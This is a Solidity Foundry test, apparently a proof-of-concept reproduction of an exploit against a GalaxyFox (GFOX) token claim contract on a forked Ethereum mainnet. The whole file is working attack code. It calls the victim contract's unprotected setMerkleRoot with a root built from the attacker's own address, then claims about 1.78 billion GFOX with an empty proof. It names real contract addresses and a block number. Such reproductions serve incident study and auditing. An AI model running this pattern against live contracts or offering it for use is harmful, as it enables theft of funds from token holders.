// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";

import "./IGalaxyFox.sol";

interface IVictim {
    function setMerkleRoot(bytes32 _merkleRoot) external;

    function claim(
        address to,
        uint256 amount,
        bytes32[] calldata proof
    ) external;
}

IGalaxyFox constant gfox = IGalaxyFox(
    payable(0x8F1CecE048Cade6b8a05dFA2f90EE4025F4F2662)
);
IVictim constant victim = IVictim(0x11A4a5733237082a6C08772927CE0a2B5f8A86B6);

contract GFOXExploit is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19_835_924);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() external {
        print("GFOX Balance Before", gfox.balanceOf(address(this)), 18);

        // the amount of GFOX to be transferred
        uint256 amount = 1780453099185000000000000000;
        // set the merkle root
        bytes32 root = _merkleRoot(address(this), amount);
        victim.setMerkleRoot(root);
        // claim the GFOX
        victim.claim(address(this), amount, new bytes32[](0));

        print("GFOX Balance Before", gfox.balanceOf(address(this)), 18);
    }

    function _merkleRoot(
        address to,
        uint256 amount
    ) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(to, amount));
    }
}
